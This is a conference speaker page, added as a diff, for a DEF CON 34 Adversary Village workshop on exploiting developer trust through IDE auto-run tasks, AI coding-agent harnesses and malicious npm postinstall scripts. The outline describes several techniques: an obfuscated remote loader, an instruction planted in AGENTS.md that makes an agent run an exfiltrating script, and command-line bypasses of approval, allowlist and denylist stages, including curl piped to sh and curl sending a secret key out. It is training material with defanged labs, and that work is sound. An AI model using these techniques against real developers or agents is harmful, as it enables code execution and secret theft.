@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+
+<head>
+
+   <meta charset="utf-8">
+   <title>Michael Chan | Adversary Village at DEF CON 34</title>
+   <meta name="description" content="Michael Chan - Senior Offensive Security Consultant @ KPMG Canada. Presenting the hands-on workshop 'Vibe Check: How Adversaries Exploit Developer Trust from Malicious Repos to AI Agents' at Adversary Village, DEF CON 34, Las Vegas.">
+   <meta name="keywords" content="Michael Chan, Vibe Check: How Adversaries Exploit Developer Trust from Malicious Repos to AI Agents, Adversary Village, DEF CON 34, hands-on workshop, adversary simulation, adversary emulation, offensive security, red team, purple teaming">
+   <meta name="author" content="Adversary Village at DEF CON 34">
+   <meta name="robots" content="index, follow">
+   <link rel="canonical" href="https://adversaryvillage.org/adversary-events/DEFCON-34/Michael-Chan/">
+   <meta property="og:type" content="profile" />
+   <meta property="og:site_name" content="Adversary Village" />
+   <meta property="og:url" content="https://adversaryvillage.org/adversary-events/DEFCON-34/Michael-Chan/" />
+   <meta property="og:title" content="Michael Chan | Adversary Village at DEF CON 34" />
+   <meta property="og:description" content="Michael Chan - Senior Offensive Security Consultant @ KPMG Canada. Presenting the hands-on workshop 'Vibe Check: How Adversaries Exploit Developer Trust from Malicious Repos to AI Agents' at Adversary Village, DEF CON 34, Las Vegas." />
+   <meta property="og:image" itemprop="image" content="https://adversaryvillage.org/adversary-events/DEFCON-34/images/speakers/Michael-Chan.png" />
+   <meta name="twitter:card" content="summary_large_image" />
+   <meta name="twitter:site" content="@AdversaryVillag" />
+   <meta name="twitter:title" content="Michael Chan | Adversary Village at DEF CON 34" />
+   <meta name="twitter:description" content="Michael Chan - Senior Offensive Security Consultant @ KPMG Canada. Presenting the hands-on workshop 'Vibe Check: How Adversaries Exploit Developer Trust from Malicious Repos to AI Agents' at Adversary Village, DEF CON 34, Las Vegas." />
+   <meta name="twitter:image" content="https://adversaryvillage.org/adversary-events/DEFCON-34/images/speakers/Michael-Chan.png" />
+   <script type="application/ld+json">
+{
+    "@context":  "https://schema.org",
+    "@type":  "ProfilePage",
+    "mainEntity":  {
+                       "@type":  "Person",
+                       "name":  "Michael Chan",
+                       "jobTitle":  "Senior Offensive Security Consultant @ KPMG Canada",
+                       "description":  "Michael is a social scientist turned hacker. He started by studying human behaviour and trust at Oxford - now he brings that lens into offensive security, validating and breaking the assumptions built into applications, systems, and organizations. As a Senior Offensive Security Consultant at KPMG Canada, Michael works across application security, threat modelling, and adversary simulation. Outside of work, he spends most of his time learning, building, breaking fun new tech (yes AI included), and engaging with local cyber communities.",
+                       "url":  "https://adversaryvillage.org/adversary-events/DEFCON-34/Michael-Chan/",
+                       "image":  "https://adversaryvillage.org/adversary-events/DEFCON-34/images/speakers/Michael-Chan.png",
+                       "sameAs":  [
+                                      "https://www.linkedin.com/in/michael-kh-chan/"
+                                  ],
+                       "performerIn":  {
+                                           "@type":  "Event",
+                                           "name":  "Adversary Village at DEF CON 34",
+                                           "startDate":  "2026-08-07",
+                                           "endDate":  "2026-08-09",
+                                           "location":  {
+                                                            "@type":  "Place",
+                                                            "name":  "Las Vegas Convention Center",
+                                                            "address":  "Las Vegas, NV, USA"
+                                                        }
+                                       }
+                   }
+}
+   </script>
+   <meta name="viewport" content="width=device-width, initial-scale=1">
+   <link rel="stylesheet" href="../../../css/base.css">
+   <link rel="stylesheet" href="../../../css/vendor.css">
+   <link rel="stylesheet" href="../../../css/main.css">
+   <link rel="stylesheet" href="../css/speaker.css">
+   <script src="../js/modernizr.js"></script>
+   <script src="../js/pace.min.js"></script>
+   <link rel="apple-touch-icon" sizes="57x57" href="../../../favicon/apple-icon-57x57.png">
+   <link rel="apple-touch-icon" sizes="60x60" href="../../../favicon/apple-icon-60x60.png">
+   <link rel="apple-touch-icon" sizes="72x72" href="../../../favicon/apple-icon-72x72.png">
+   <link rel="apple-touch-icon" sizes="76x76" href="../../../favicon/apple-icon-76x76.png">
+   <link rel="apple-touch-icon" sizes="114x114" href="../../../favicon/apple-icon-114x114.png">
+   <link rel="apple-touch-icon" sizes="120x120" href="../../../favicon/apple-icon-120x120.png">
+   <link rel="apple-touch-icon" sizes="144x144" href="../../../favicon/apple-icon-144x144.png">
+   <link rel="apple-touch-icon" sizes="152x152" href="../../../favicon/apple-icon-152x152.png">
+   <link rel="apple-touch-icon" sizes="180x180" href="../../../favicon/apple-icon-180x180.png">
+   <link rel="icon" type="image/png" sizes="192x192" href="../../../favicon/android-icon-192x192.png">
+   <link rel="icon" type="image/png" sizes="32x32" href="../../../favicon/favicon-32x32.png">
+   <link rel="icon" type="image/png" sizes="96x96" href="../../../favicon/favicon-96x96.png">
+   <link rel="icon" type="image/png" sizes="16x16" href="../../../favicon/favicon-16x16.png">
+   <link rel="manifest" href="../../../favicon/manifest.json">
+   <meta name="msapplication-TileColor" content="#ffffff">
+   <meta name="msapplication-TileImage" content="../../../favicon/ms-icon-144x144.png">
+   <meta name="theme-color" content="#ffffff">
+</head>
+
+<body id="top">
+
+   <div id="preloader">
+      <div id="loader" class="dots-jump">
+         <div></div>
+         <div></div>
+         <div></div>
+      </div>
+   </div>
+
+   <header class="s-header">
+      <div class="row">
+         <div class="header-logo">
+            <a class="site-logo" href="../../../">
+               <img src="../../../images/adversary-village-org.png" alt="Homepage">
+            </a>
+         </div>
+         <nav class="header-nav-wrap">
+            <ul class="header-main-nav">
+               <li><a href="../../../">Home</a></li>
+               <li class="current"><a href="../../">Events</a>
+               </li>
+               <li><a href="../../../call-for-papers">Call for papers</a></li>
+               <li><a href="../../../adversary-wars-ctf">Adversary Wars CTF</a></li>
+               <li><a href="../../../sponsors">Sponsors</a></li>
+               <li><a href="../../../live-streaming-series">LiveStream</a></li>
+               <li><a href="../../../about-us">About</a></li>
+            </ul>
+         </nav>
+         <a class="header-menu-toggle" href="#"><span></span></a>
+      </div>
+   </header>
+
+   <section id="features" class="s-features target-section" style="background-color: #0e0e0e; color: #f1b435;">
+      <div class="row section-header" data-aos="fade-up">
+         <div class="col-full">
+            <h1 class="display-1" style="color: #f1b435;  text-align: center; padding-bottom: 4.8rem; ">
+               [Speakers]</br>Adversary Village at </br>DEF CON 34
+            </h1>
+            <div class="home-content__btn-wrap" style="margin-top: 2.2rem; text-align: center;">
+               <a href="../" class="btn btn--primary" target="_blank"
+                  style="background-color: #105f66; border-color:#105f66;">
+                  DEF CON 34 Schedule
+               </a>
+
+            </div>
+         </div>
+
+      </div>
+   </section>
+   <section id="features" style="background-color:white;">
+      <div class="row half-bottom" style="background-color:white;">
+         <div class="col-six tab-full">
+            </br>
+            <p style="text-align: center;"><img src="../images/speakers/Michael-Chan.png"
+                  sizes="(max-width: 1000px) 100vw, 1000px" alt="Michael Chan">
+            <div class="footer-social-icons">
+               <ul class="social-icons">
+                  <li><a href="https://www.linkedin.com/in/michael-kh-chan/" target="_blank" class="social-icon"> <i
+                           class="fa fa-linkedin linkedin"></i></a></li>
+                  <li><a href="#" target="_blank" class="social-icon"> <i
+                           class="fa fa-twitter twitter"></i></a></li>
+               </ul>
+            </div>
+            </p>
+         </div>
+         <div class="col-six tab-full">
+            <h2> Michael Chan </h2>
+            <p class="job">Senior Offensive Security Consultant @ KPMG Canada</p>
+            <p>Michael is a social scientist turned hacker. He started by studying human behaviour and trust at Oxford - now he brings that lens into offensive security, validating and breaking the assumptions built into applications, systems, and organizations. As a Senior Offensive Security Consultant at KPMG Canada, Michael works across application security, threat modelling, and adversary simulation. Outside of work, he spends most of his time learning, building, breaking fun new tech (yes AI included), and engaging with local cyber communities.</p>
+         </div>
+      </div>
+   </section>
+
+   <section id="features" style="background-color:#0e0e0e; padding-top: 20px; color: white;">
+
+      <div class="row" style="background-color:#0e0e0e; color: white;">
+         <div class="col-twelve tab-full">
+
+            <h2 style="color: #6ccdb8;">Vibe Check: How Adversaries Exploit Developer Trust from Malicious Repos to AI Agents</h2>
+            <p>
+               <span style="font-weight: 600; color: white;">11:00-12:55 PDT | Saturday, Aug 8<sup>th</sup> 2026 | Adversary Village Workshop Stage, Las Vegas Convention Center</span>
+               </br>
+               <span style="font-size:1rem; background-color: #105f66; padding: 4px; color: white;">Hands-on Workshop</span>
+            </p>
+            
+            <h3 style="color:#f1b435; margin-top:2rem;">Abstract</h3>
+            <div style="color:white;"><p>"Do you trust the authors of the files in this folder?" It's a prompt modern IDEs throw at developers, and most click past it by reflex. In 2026, adversaries turned that reflex into an initial-access vector - North Korean operators (Void Dokkaebi / Famous Chollima) now lure developers into cloning malicious repos that execute the moment a folder opens, with 750+ infected repositories catalogued so far.</p><br>
+<p>This hands-on workshop has attendees emulate attacks across the three boundaries developers trust by default: the IDE, the AI coding agent, and the package manager. Participants build and run the artifacts themselves: a take-home-assessment repo that fires malicious payloads in IDEs, a "Claude Code"-style agent harness hardened and then bypassed one layer at a time to achieve code execution, and a trojanized npm package that runs before any code imports it. Each is drawn from real 2026 attacks &amp; vulnerabilities: DPRK interview lures, agent-harness CVEs, and the recent Shai-Hulud npm worm.</p></div>
+            <h3 style="color:#f1b435; margin-top:2rem;">Workshop outline</h3>
+            <div style="color:white;"><p>The core idea<br>
+Every attack in this workshop is the same shape: how developer trust can be exploited on seemingly trusted tools, such as IDEs, AI agents, and package managers. Attendees will build malicious artifacts themselves, and run them against their own vulnerable targets. In particular, the AI section aims to deliver the message that while LLM is probabilistic, the harness around it is just deterministic software, and it falls to the same classic application weaknesses if built without proper hardening.</p><br>
+<p>Module 1 - Repo &amp; IDE trust (~45 min)<br>
+Attendees will work on a malicious take-home assessment repo. Two vectors: a hex-obfuscated remote payload pulled in through new Function + injected require on npm start, and a .vscode/tasks.json task with runOn:folderOpen that fires before you touch anything.  While tools like VS Code now gates this behind workspace trust by default, some forked IDEs like Cursor disable the safeguard by default. Developers may also be pressured to disable the safeguard in a fake interview setting - highly mapped to the DPRK fake-interview campaigns active through 2026.</p><br>
+<p>Module 2 - Agent harness (~60 min)<br>
+Attendees will point a "Claude Code"-style harness at malicious repos and harden it one stage at a time: open auto-run, then per-command approval, then an allowlist, then anti-chaining, then allow + denylist. Each stage gets bypassed with a technique that maps to real disclosed CVEs &amp; known vulnerabilities, such as truncated approval UI, GTFOBins, piped commands, and exfiltration that never needs code execution at all. The end goal is to make the audience reflect on the three questions when using AI agents: what did the model request, what did the harness show, what actually ran. </p><br>
+<p>Module 3 - Package managers (~45 min)<br>
+Attendees will build a malicious local package and install it with npm install ../evil-package, then watch the postinstall fire before any of their code imports it. The lesson is that npm install is not just a download: lifecycle scripts run as your user, with your environment, with access to your home directory, git config, and SSH agent. A worm simulation then enumerates sibling packages the way Shai-Hulud did, mapped to the 2026 incidents that turned it into a recurring pattern (TanStack, node-ipc, GlassWorm's invisible-unicode payloads).</p><br>
+<p>Wrap-up (~15 min)<br>
+Back to the one pattern, then a hardening checklist and a short triage for each branch: bad workspace opened, agent ran something off, npm install went wrong.</p><br>
+<p>Setup and safety<br>
+Everything is intentionally defanged. The payloads only write marker files inside the container to simulate a successful exfiltration. Attendees need Docker or Podman and nothing else; the image is pulled at the start, and a browser-based IDE is bundled so there's no host editor to configure. </p><br>
+<p>Fitting the time slot<br>
+The modules can be compressed depending on the time: 2 hours: Modules 1-2 plus wrap-up, with supply chain shown as a guided demo. 2.5 hours: add the npm lab. 3 hours: all three hands-on with room to discuss.</p><br>
+<p>"Do you trust the authors of the files in this folder?" It's a prompt modern IDEs throw at developers, and most click past it by reflex. But as vibe coding and AI agents accelerate development, that implicit trust in tools like VS Code and GitHub has become a critical attack surface and malware delivery channel.<br>
+This hands-on workshop places attendees in the mindset of an attacker targeting modern development environments. After dissecting real 2026 attacks and AI-agent vulnerabilities, we move into labs where participants build and run their own PoCs: malicious repos that trigger code execution in IDEs, a "Claude Code"-style agent harness we will hack &amp; break together, and trojanized npm packages that run before any code imports them.</p><br>
+<p>The core idea<br>
+Adversaries no longer need an exploit to compromise a developer - they need the developer to trust the wrong thing. This workshop emulates that playbook across the three boundaries developers extend trust to by default: the IDE, the AI agent, and the package manager. Each is a live initial-access and supply-chain vector in 2026, used by actors from DPRK interview-lure operators to the crews behind the npm worms. Attendees take the adversary's side and build the artifacts themselves - a repo that executes on open, an AI agent coerced into running attacker commands, a package that fires before any code imports it - then run them against their own targets inside a provided container.</p><br>
+<p>Module 1 - Repo &amp; IDE trust (~45 min)<br>
+Attendees work through a malicious take-home assessment repo, the same shape DPRK operators (Void Dokkaebi / Famous Chollima) use in fake-interview lures.</p><br>
+<p>Lab 1a - Execution on npm start. The repo looks like a normal Express app. A hex-encoded string in config.js decodes via Buffer.from(str,'hex') to an attacker URL. axios.get() fetches a remote snippet, which is compiled with new Function('loadModule', snippet) and handed require as loadModule - giving the fetched code full Node capability (fs, os, process, network). Attendees run it, then grep the repo and find nothing: the payload lives off-repo on the attacker's server and can change or stay dormant at will.</p><br>
+<p>Lab 1b - Execution on folder-open, no command run. Attendees inspect the repo first (the "safe" approach) and still get popped. A .vscode/tasks.json task with runOn: folderOpen fires the moment the workspace opens. We cover the real trust nuance: VS Code gates this behind Workspace Trust by default (auto-tasks disabled until Jan 2026), but forks like Cursor historically auto-fired with no prompt (Oasis disclosure, Sept 2025). We also cover the social-engineering path - urgency/authority pressure in a fake interview to get the developer to click "Trust Folder" themselves - and the related .vscode/settings.json (git.path, terminal.integrated.env.*) and .devcontainer/devcontainer.json (initializeCommand, postCreateCommand) execution surfaces.</p><br>
+<p>Anchor: Trend Micro's 2026 Void Dokkaebi reporting - 750+ infected repos, 500+ malicious tasks.json configs, DEV#POPPER RAT delivery.</p><br>
+<p>Module 2 - Agent harness (~60 min)Attendees drive a provided "Claude Code"-style harness against malicious repos and harden it one stage at a time, bypassing each layer. After every round they answer three questions: what did the model request, what did the harness show, what actually ran - the three rarely match.</p><br>
+<p>Lab 2 - five hardening stages, each bypassed:</p><br>
+<p>1. No policy (yolo). Harness auto-loads AGENTS.md and pins it as a system prompt; the planted instruction tells the model to run python scripts/register.py, which exfiltrates. Real-world parallel: --yes-always, --yolo, --dangerously-skip-permissions.<br>
+2. Per-command approval. Bypassed via a truncated approval UI - a long benign-looking command (git status ; echo '...' ; python scripts/register.py) where the malicious tail is hidden past the display limit. Parallel: early Gemini CLI (Tracebit).<br>
+3 .First-token allowlist. curl is allowlisted; curl … | sh runs because the harness passes the full string to a shell and the pipe hijacks it.<br>
+4. Anti-chaining (block ;, &amp;&amp;, |, backticks, $()). Bypassed with GTFOBins-style argument abuse inside an allowed program: find scripts/register.py -exec python {} +. No shell metacharacters needed.<br>
+5. Allow + denylist (block exec(, os.system, subprocess., b64decode, requests.*, etc.). Bypassed without code execution at all: allowlisted curl exfiltrates the secret over HTTP (curl http://…/audit?id=$SUPER_SECRET_API_KEY).</p><br>
+<p>We close by mapping each bypass to a disclosed 2026 agent CVE/advisory (Claude Code, Gemini CLI, Cursor, OpenCode, Cline) and contrast the five tool-permission stages against the full defense stack a commercial harness layers on (input/output classifiers, suspicious-activity routing, sandboxing).</p><br>
+<p>Module 3 - Package managers (~45 min)</p><br>
+<p>Lab 3a - postinstall execution. Attendees build a local evil-package and run npm install ../evil-package (no registry needed, works offline). The postinstall fires with --foreground-scripts so execution is visible. The lesson: npm install is not a download - lifecycle scripts (preinstall/install/postinstall/prepare) run as your user, with your environment, before any require(), with access to ~/.npmrc, git config, and the SSH agent.</p><br>
+<p>Lab 3b - worm enumeration. A defanged Shai-Hulud-style simulation enumerates sibling package names (read-only - it never modifies a package.json) to show the self-propagation step: stolen NPM_TOKEN → republish the maintainer's other packages → exponential fanout. Anchored to 2026 incidents: TanStack (84 malicious versions / 42 packages, OIDC theft via pull_request_target), node-ipc reincident (&gt;10M weekly downloads), and GlassWorm's invisible-unicode payloads shown via a cat vs xxd contrast (a file that looks empty is 1KB of code to the parser).</p><br>
+<p>Setup and safety<br>
+Everything is intentionally defanged: payloads steal nothing real, contact no real server, persist nothing, and only write marker files under /tmp/labs/ inside the container to simulate exfiltration. Attendees need only Docker or Podman - the image (~800 MB) is pulled at the start, and a browser-based IDE is bundled so there's no host editor to configure. Teardown removes the image and reminds attendees to rotate any key exported during the agent lab.</p></div>
+         </div>
+      </div>
+   </section>
+
+
+   <section id="schedule" class="section-with-bg"
+      style="padding-top:35px; padding-bottom: 20px; background: url('../images/dc34-wall-adv.png'); background-repeat: no-repeat; background-size: cover;">
+      <div class="container aos-init aos-animate" data-aos="fade-up">
+
+         <div class="row section-header align-center" data-aos="fade-up">
+            <div class="col-full">
+
+               <p class="lead" style="font-size: 4rem; font-weight: 900; color: #6ccdb8;">
+                  Agency.
+               </p>
+            </div>
+
+         </div>
+         <div class="row align-center" data-aos="fade-up">
+            <div class="row download-bottom-image" data-aos="fade-up">
+               <div class="col-twelve tab-full" style="padding 0 2px;">
+
+                  <style>
+                     @media (min-width: 1000px) {
+                        .contents {
+                           margin-left: 10%;
+                        }
+                     }
+                  </style>
+                  <center>
+                     <div class="col-five contents" style="padding-right:0px;">
+                        <a href="https://defcon.org/html/defcon-34/dc-34-index.html" target="_blank">
+                           <img width="250" height="112" class="pull-center" alt="DEF CON 34"
+                              src="../images/dc34-logo-adv.png"></a>
+
+                     </div>
+
+                     <div class="col-seven" style="width: 40%;">
+                        <a href="https://adversaryvillage.org/adversary-events/DEFCON-34/" target="_blank"
+                           style="padding-left:-50%">
+                           <img width="250" height="112" class="pull-center" alt="Adversary Village"
+                              src="../images/adv-logo-dc33.png"></a>
+
+                     </div>
+                  </center>
+               </div>
+
+            </div>
+
+         </div>
+
+         </br>
+
+   </section>
+
+
+   <section id="download" class="s-download target-section" style="background-color: #121619; padding-top:8rem;">
+
+      <div class="row section-header align-center" data-aos="fade-up">
+         <div class="col-full">
+            <h1 class="display-1">
+               Join Adversary Village Discord Server.
+            </h1>
+            <p class="lead">
+               Join Adversary Village official Discord server to connect with our amazing community of adversary
+               simulation experts and offensive security researchers!
+            </p>
+         </div>
+      </div>
+
+      <div class="row">
+         <div class="col-full text-center">
+            <ul class="download-badges" data-aos="fade-up">
+               <li><a href="https://discord.gg/GDB3rC7KYz" title="" class="badge-appstore" target="_blank">Join
+                     Discord</a></li>
+
+            </ul>
+         </div>
+      </div>
+
+
+
+   </section>
+
+   <footer class="s-footer footer">
+
+
+      <div class="row footer__bottom">
+         <div class="footer__about col-five tab-full left">
+            <h4>About Adversary Village.</h4>
+            <p>
+               Adversary Village is a community initiative purely focuses on Adversary simulation, emulation tactics,
+               Simulation CTFs, Supply chain security, Adversary Tactics, Philosophy, life, urban survival skills and a
+               bit of purple teaming.
+            </p>
+            <ul class="footer__social">
+               <li><a href="https://twitter.com/AdversaryVillag" target="_blank"><i class="fab fa-x-twitter"
+                        aria-hidden="true"></i></a></li>
+               <li><a href="https://instagram.com/AdversaryVillage" target="_blank"><i class="fab fa-instagram"
+                        aria-hidden="true"></i></a></li>
+               <li><a href="https://www.linkedin.com/company/adversaryvillage" target="_blank"><i
+                        class="fab fa-linkedin" aria-hidden="true"></i></a></li>
+               <li><a href="https://facebook.com/AdversaryVillage" target="_blank"><i class="fab fa-facebook-f"
+                        aria-hidden="true"></i></a></li>
+               <li><a href="https://twitch.tv/AdversaryVillage" target="_blank"><i class="fab fa-twitch"
+                        aria-hidden="true"></i></a></li>
+               <li><a href="https://youtube.com/AdversaryVillage" target="_blank"><i class="fab fa-youtube"
+                        aria-hidden="true"></i></a></li>
+               <li><a href="https://defcon.social/@AdversaryVillage" target="_blank"><i class="fab fa-mastodon"
+                        aria-hidden="true"></i></a></li>
+               <li><a href="https://discord.gg/GDB3rC7KYz" target="_blank"><i class="fab fa-discord"
+                        aria-hidden="true"></i></a></li>
+            </ul>
+         </div>
+         <div class="col-five md-seven tab-full right end">
+            <div class="row">
+               <div class="footer__site-links col-five mob-full">
+                  <h4>Site links.</h4>
+                  <ul class="footer__site-links">
+                     <li><a href="../../DEFCON-34" target="_blank">DEF CON 34</a></li>
+                     <li><a href="../../../about-us">About Us</a></li>
+                     <li><a href="../../../call-for-papers">Call for papers</a></li>
+                     <li><a href="../../../call-for-volunteers">Call for volunteers</a></li>
+                     <li><a href="https://discord.gg/GDB3rC7KYz" target="_blank">Join Discord</a></li>
+                     <li><a href="
+                           https://www.defcon.org/html/links/dc-code-of-conduct.html">Code of conduct</a></li>
+                  </ul>
+               </div>
+               <div class="footer__contact col-seven mob-full">
+                  <h4>Contact Us.</h4>
+                  <p>
+                     Would you like to sponsor? or have a question for us? Ping us: <br>
+                     <a href="mailto:hello@adversaryvillage.org"
+                        class="footer__mail-link">hello@adversaryvillage.org</a>
+                  </p>
+               </div>
+            </div>
+         </div>
+         <div class="col-full ss-copyright">
+            <span>Copyright &copy; 2021-2026, Adversary Village<sup>&reg;</sup> All Rights Reserved.</span>
+         </div>
+      </div>
+      <div class="go-top">
+         <a class="smoothscroll" title="Back to Top" href="#top"></a>
+      </div>
+   </footer>
+   <script src="../js/jquery-3.2.1.min.js"></script>
+   <script src="../js/plugins.js"></script>
+   <script src="../js/main.js"></script>
+</body>
+
+</html>
